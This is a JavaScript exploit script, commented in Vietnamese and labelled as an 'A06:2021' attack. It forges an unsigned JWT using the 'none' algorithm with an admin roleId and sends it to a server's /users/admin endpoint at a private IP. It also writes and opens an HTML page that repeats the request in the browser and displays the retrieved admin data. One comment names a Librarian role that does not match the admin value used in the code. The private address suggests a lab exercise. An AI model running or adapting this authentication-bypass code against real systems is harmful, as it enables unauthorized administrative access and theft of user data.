import jwt from 'jsonwebtoken';
import axios from 'axios';
import open from 'open';
import { writeFileSync } from 'fs';

// Bước 1: Tạo token giả mạo với thuật toán "none"
function createFakeToken() {
    try {
        // Tạo payload giả mạo với roleId: 3 (Librarian)
        const payload = {
            id: "68028a9d834d6b540be78259", // ID người dùng bất kỳ
            roleId: 1, // Quyền Admin
            iat: Math.floor(Date.now() / 1000),
            exp: Math.floor(Date.now() / 1000) + 900 // Hết hạn sau 15 phút
        };

        // Tạo token với thuật toán "none"
        const token = jwt.sign(payload, '', { algorithm: 'none' });
        console.log('Fake Token:', token);
        return token;
    } catch (error) {
        console.error('Lỗi khi tạo token giả mạo:', error.message);
        throw error;
    }
}

// Bước 2: Sử dụng token giả mạo để truy cập /users/admin và mở trình duyệt
async function exploitUsersAdmin(token) {
    try {
        console.log('Đang gửi yêu cầu GET đến /users/admin...');
        const response = await axios.get('http://192.168.1.2:4000/users/admin', {
            headers: {
                'Authorization': `Bearer ${token}`
            }
        });

        console.log('Yêu cầu thành công! Status:', response.status);
        console.log('Dữ liệu lấy được:', response.data.slice(0, 200) + '...');

        // Bước 3: Mở trình duyệt với trang /users/admin và token giả mạo
        const url = 'http://192.168.1.2:4000/users/admin';
        console.log(`Đang mở trình duyệt tại ${url} với token giả mạo...`);

        // Tạo file HTML tạm thời để gửi yêu cầu từ trình duyệt
        const html = `
                <!DOCTYPE html>
                <html lang="vi">
                <head>
                    <meta charset="UTF-8">
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <title>Khai Thác Lỗ Hổng A06:2021</title>
                    <style>
                        :root {
                            --primary-color: #2c3e50;
                            --secondary-color: #3498db;
                            --success-color: #27ae60;
                            --error-color: #e74c3c;
                            --background-gradient: linear-gradient(135deg, #74ebd5 0%, #ACB6E5 100%);
                        }

                        * {
                            margin: 0;
                            padding: 0;
                            box-sizing: border-box;
                        }

                        body {
                            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                            background: var(--background-gradient);
                            color: var(--primary-color);
                            min-height: 100vh;
                            display: flex;
                            justify-content: center;
                            align-items: center;
                            padding: 20px;
                        }

                        .container {
                            background-color: rgba(255, 255, 255, 0.95);
                            border-radius: 20px;
                            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
                            padding: 40px;
                            max-width: 1000px;
                            width: 95%;
                            text-align: center;
                            animation: fadeIn 0.8s ease-out;
                            backdrop-filter: blur(10px);
                        }

                        @keyframes fadeIn {
                            from { 
                                opacity: 0; 
                                transform: translateY(30px); 
                            }
                            to { 
                                opacity: 1; 
                                transform: translateY(0); 
                            }
                        }

                        h1 {
                            font-size: 2.5em;
                            margin-bottom: 25px;
                            color: var(--primary-color);
                            position: relative;
                            padding-bottom: 15px;
                        }

                        h1::after {
                            content: '';
                            position: absolute;
                            bottom: 0;
                            left: 50%;
                            transform: translateX(-50%);
                            width: 100px;
                            height: 4px;
                            background: var(--secondary-color);
                            border-radius: 2px;
                        }

                        .status-message {
                            font-size: 1.2em;
                            margin: 20px 0;
                            padding: 15px;
                            border-radius: 10px;
                            background-color: #f8f9fa;
                            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
                        }

                        .loading {
                            color: var(--secondary-color);
                            font-weight: 500;
                        }

                        .success {
                            color: var(--success-color);
                            font-weight: 600;
                        }

                        .error {
                            color: var(--error-color);
                            font-weight: 600;
                        }

                        pre {
                            background-color: #f8f9fa;
                            border: 1px solid #e9ecef;
                            border-radius: 12px;
                            padding: 25px;
                            text-align: left;
                            font-family: 'Fira Code', 'Courier New', monospace;
                            font-size: 0.95em;
                            max-height: 500px;
                            overflow-y: auto;
                            white-space: pre-wrap;
                            word-wrap: break-word;
                            margin: 20px 0;
                            box-shadow: inset 0 2px 5px rgba(0,0,0,0.05);
                        }

                        pre::-webkit-scrollbar {
                            width: 8px;
                        }

                        pre::-webkit-scrollbar-track {
                            background: #f1f1f1;
                            border-radius: 4px;
                        }

                        pre::-webkit-scrollbar-thumb {
                            background: var(--secondary-color);
                            border-radius: 4px;
                        }

                        pre::-webkit-scrollbar-thumb:hover {
                            background: #2980b9;
                        }

                        .loading-spinner {
                            display: inline-block;
                            width: 50px;
                            height: 50px;
                            border: 5px solid #f3f3f3;
                            border-top: 5px solid var(--secondary-color);
                            border-radius: 50%;
                            animation: spin 1s linear infinite;
                            margin: 20px 0;
                        }

                        @keyframes spin {
                            0% { transform: rotate(0deg); }
                            100% { transform: rotate(360deg); }
                        }
                    </style>
                </head>
                <body>
                    <div class="container">
                        <h1>Khai Thác Lỗ Hổng A06:2021</h1>
                        <div class="status-message loading">
                            <div class="loading-spinner"></div>
                            <p>Đang khai thác và lấy dữ liệu từ /users/admin...</p>
                        </div>
                        <script>
                            fetch('${url}', {
                                method: 'GET',
                                headers: {
                                    'Authorization': 'Bearer ${token}'
                                }
                            })
                            .then(response => response.text())
                            .then(data => {
                                document.body.innerHTML = \`
                                    <div class="container">
                                        <h1>Khai Thác Thành Công!</h1>
                                        <div class="status-message success">
                                            <p>✓ Dữ liệu đã được lấy thành công từ /users/admin</p>
                                        </div>
                                        <pre>\${data}</pre>
                                    </div>
                                \`;
                            })
                            .catch(error => {
                                document.body.innerHTML = \`
                                    <div class="container">
                                        <h1>Lỗi Khai Thác</h1>
                                        <div class="status-message error">
                                            <p>✗ Không thể lấy dữ liệu từ /users/admin</p>
                                        </div>
                                        <pre>\${error.message}</pre>
                                    </div>
                                \`;
                            });
                        </script>
                    </div>
                </body>
                </html>
                `;

        // Lưu HTML tạm thời và mở trong trình duyệt
        writeFileSync('exploit-result.html', html);
        await open('exploit-result.html');
    } catch (error) {
        console.error('Lỗi khi gửi yêu cầu:');
        console.error('Status:', error.response ? error.response.status : 'N/A');
        console.error('Data:', error.response ? error.response.data : error.message);
        throw error;
    }
}

// Hàm chính
async function exploitA06() {
    try {
        // Tạo token giả mạo
        const fakeToken = createFakeToken();

        // Sử dụng token giả mạo để truy cập /users/admin và mở trình duyệt
        await exploitUsersAdmin(fakeToken);

        console.log('\nKhai thác A06 hoàn tất! Kiểm tra trình duyệt để xem dữ liệu lấy được.');
    } catch (error) {
        console.error('Khai thác thất bại:', error.message);
    }
}

// Chạy chương trình
exploitA06();